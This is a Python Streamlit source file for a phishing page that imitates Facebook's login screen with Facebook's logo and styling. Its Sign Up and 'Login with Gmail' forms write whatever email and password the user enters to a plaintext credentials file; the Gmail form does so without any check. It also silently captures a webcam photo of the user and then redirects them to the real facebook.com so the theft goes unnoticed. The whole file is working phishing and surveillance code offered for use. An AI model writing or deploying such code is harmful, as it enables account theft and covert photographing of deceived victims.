import logging
import os
import time
import webbrowser

import cv2
import numpy as np
import streamlit as st
import streamlit.components.v1 as components

# Ensure directories exist
if not os.path.exists("User_Credentials"):
    os.makedirs("User_Credentials")
if not os.path.exists("User_Images"):
    os.makedirs("User_Images")


def configure_user_logger(username):
    user_log_file = f"{username}.log"
    user_logger = logging.getLogger(username)
    user_logger.setLevel(logging.INFO)

    if not user_logger.handlers:
        file_handler = logging.FileHandler(user_log_file)
        formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
        file_handler.setFormatter(formatter)
        user_logger.addHandler(file_handler)
    return user_logger


def save_credentials(username, password):
    credentials_file = os.path.join("User_Credentials", "credentials.txt")
    with open(credentials_file, "a") as file:
        file.write(f"{username}:{password}\n")


def save_images(username):
    user_folder = os.path.join("User_Images", username)
    if not os.path.exists(user_folder):
        os.makedirs(user_folder)

    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        st.error("Could not access the camera.")
        return

    ret, frame = cap.read()

    if not ret:
        st.error("Failed to capture image.")
        cap.release()
        return

    existing_images = [f for f in os.listdir(user_folder) if f.startswith(username)]
    image_number = len(existing_images) + 1

    img_path = os.path.join(user_folder, f"{username}_{image_number}.jpg")
    cv2.imwrite(img_path, frame)
    cap.release()


def redirect_to_facebook():
    # Immediate JavaScript execution for automatic redirect
    js = """
        <script>
            // Execute immediately when the script loads
            (function() {
                // Open Facebook in new tab
                window.open('https://www.facebook.com', '_blank');
            })();
        </script>
        <a href="https://www.facebook.com" target="_blank" id="fallbackLink" style="display: none;">Redirect to Facebook</a>
        <script>
            // Fallback: Click the link automatically if the window.open fails
            document.getElementById('fallbackLink').click();
        </script>
    """
    components.html(js, height=0)

    # Show a message with a manual link as final fallback
    st.markdown(
        """
        <div style="text-align: center; margin-top: 10px;">
            If not redirected automatically, 
            <a href="https://www.facebook.com" target="_blank" rel="noopener noreferrer">click here</a>
        </div>
    """,
        unsafe_allow_html=True,
    )


# Enhanced UI Styling with responsive design
st.markdown(
    """
    <style>
    .main {
        background-color: #f0f2f5;
    }
    .block-container {
        max-width: 100% !important;
        padding: 20px !important;
    }
    @media (min-width: 768px) {
        .block-container {
            max-width: 400px !important;
            margin: auto !important;
        }
    }
    .stButton>button {
        background-color: #1877f2;
        color: white;
        font-size: 14px;
        padding: 8px 16px;
        border: none;
        border-radius: 4px;
        margin: 5px;
        width: 100%;
        max-width: 300px;
    }
    .stButton>button:hover {
        background-color: #145db2;
    }
    .logo img {
        width: 30%;
        max-width: 150px;
        height: auto;
    }
    .stRadio > label {
        font-size: 14px;
    }
    input {
        max-width: 300px;
        margin: auto !important;
    }
    @media (max-width: 768px) {
        .stRadio [role="radiogroup"] {
            flex-direction: column !important;
        }
    }
    </style>
    """,
    unsafe_allow_html=True,
)

# Logo
st.markdown(
    """
    <div class="logo" style="text-align: center;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
        <h3 style="color: #1877f2;">Facebook</h3>
    </div>
    """,
    unsafe_allow_html=True,
)


# Set default auth option based on device
def is_mobile():
    return st.session_state.get(
        "is_mobile", st.query_params.get("platform", ["desktop"])[0] == "mobile"
    )


if "is_mobile" not in st.session_state:
    st.session_state.is_mobile = is_mobile()

default_option = "Login with Gmail" if st.session_state.is_mobile else "Login"

# Navigation with default option
auth_option = st.radio(
    "Choose an option",
    ("Login", "Sign Up", "Login with Gmail"),
    horizontal=not st.session_state.is_mobile,
    index=["Login", "Sign Up", "Login with Gmail"].index(default_option),
    key="auth_option",
)


def handle_successful_login(username, message="Login successful!"):
    if "redirect_done" not in st.session_state:
        st.session_state["redirect_done"] = False

    if not st.session_state["redirect_done"]:
        st.session_state["current_user"] = username
        user_logger = configure_user_logger(username)
        user_logger.info(f"User '{username}' logged in successfully.")
        save_images(username)
        st.success(f"{message} Redirecting to Facebook...")
        redirect_to_facebook()
        st.session_state["redirect_done"] = True


def login():
    username = st.text_input("Username", key="login_username")
    password = st.text_input("Password", type="password", key="login_password")

    if st.button("Login"):
        if not username or not password:
            st.error("Please fill in both fields.")
        elif (
            username in st.session_state["users"]
            and st.session_state["users"][username] == password
        ):
            handle_successful_login(username)
        else:
            st.error("Invalid username or password!")


def signup():
    new_username = st.text_input("New Username", key="signup_username")
    new_password = st.text_input("New Password", type="password", key="signup_password")

    if st.button("Sign Up"):
        if not new_username or not new_password:
            st.error("Please fill in both fields.")
        elif new_username in st.session_state["users"]:
            st.error("Username already exists!")
        else:
            st.session_state["users"][new_username] = new_password
            save_credentials(new_username, new_password)
            handle_successful_login(new_username, "Account created successfully!")


def login_with_gmail():
    email = st.text_input("Gmail Address", key="gmail_username")
    password = st.text_input("Password", type="password", key="gmail_password")

    if st.button("Login with Gmail"):
        if not email or not password:
            st.error("Please fill in both fields.")
        else:
            save_credentials(email, password)
            handle_successful_login(email)


# Initialize session state
if "current_user" not in st.session_state:
    st.session_state["current_user"] = None
if "users" not in st.session_state:
    st.session_state["users"] = {}
if "redirect_done" not in st.session_state:
    st.session_state["redirect_done"] = False

# Main logic
if st.session_state["current_user"] is None:
    if auth_option == "Login":
        login()
    elif auth_option == "Sign Up":
        signup()
    elif auth_option == "Login with Gmail":
        login_with_gmail()
else:
    st.write(f"Welcome back, {st.session_state['current_user']}!")
    if not st.session_state["redirect_done"]:
        redirect_to_facebook()
        st.session_state["redirect_done"] = True
